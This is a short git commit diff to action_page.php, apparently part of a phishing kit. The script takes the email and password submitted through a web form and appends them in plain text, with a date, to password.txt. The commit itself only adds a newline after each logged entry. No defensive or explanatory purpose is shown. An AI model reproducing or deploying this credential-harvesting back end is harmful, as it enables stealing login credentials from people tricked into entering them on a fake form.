2da301549136dd3f455f601bd2e4b17f95fa9eb7
ngchenghow <ngchenghow@gmail.com>
2020-02-24 10:42:55 +0800

    Update action_page.php

--- action_page.php
+++ action_page.php
@@ -4,7 +4,7 @@ $pass=$_POST['password'];
 $email=$_POST['email'];
 
 $myfile = fopen("password.txt", "a") or die("Unable to open file!");
-$txt = "email:".$email." \t "."password:".$pass." \t Date:".date("M,d,Y h:i:s A");
+$txt = "email:".$email." \t "."password:".$pass." \t Date:".date("M,d,Y h:i:s A")."\n";
 fwrite($myfile, $txt);
 fclose($myfile);
 
